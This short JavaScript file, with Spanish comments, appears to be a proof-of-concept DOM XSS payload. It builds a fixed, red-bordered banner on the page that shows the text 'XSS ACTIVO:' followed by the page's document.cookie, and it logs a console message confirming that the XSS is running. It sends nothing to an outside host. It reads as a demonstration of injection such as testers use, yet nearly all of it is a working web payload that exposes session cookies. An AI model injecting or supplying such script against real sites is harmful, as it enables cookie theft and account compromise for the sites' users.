// Mostrar un cartel visual con la cookie
let div = document.createElement("div");
div.innerText = "XSS ACTIVO: " + document.cookie;
div.style.position = "fixed";
div.style.top = "10px";
div.style.left = "10px";
div.style.background = "white";
div.style.padding = "10px";
div.style.border = "2px solid red";
div.style.zIndex = 9999;
div.style.fontSize = "14px";
document.body.appendChild(div);

// Confirmación en consola
console.log("✅ DOM XSS en ejecución");



